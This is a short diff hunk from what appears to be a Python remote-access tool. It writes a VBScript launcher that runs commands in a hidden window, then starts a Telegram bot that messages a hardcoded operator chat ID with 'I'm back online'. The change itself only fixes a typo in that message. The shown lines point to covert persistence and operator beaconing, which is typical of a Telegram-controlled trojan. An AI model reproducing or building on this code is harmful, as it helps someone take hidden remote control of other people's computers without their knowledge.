@@ -157,7 +157,7 @@ oShell.Run strArgs, 0, false"""
 with open(x,"w") as bat_file:
     bat_file.write(coder)
 bot = telebot.TeleBot(tok)
-bot.send_message(6080085900,"Ура, я сновасети :)")
+bot.send_message(6080085900,"Ура, я снова в сети :)")
 @bot.message_handler(commands="start")
 def keyb(message):
     markup=types.ReplyKeyboardMarkup()
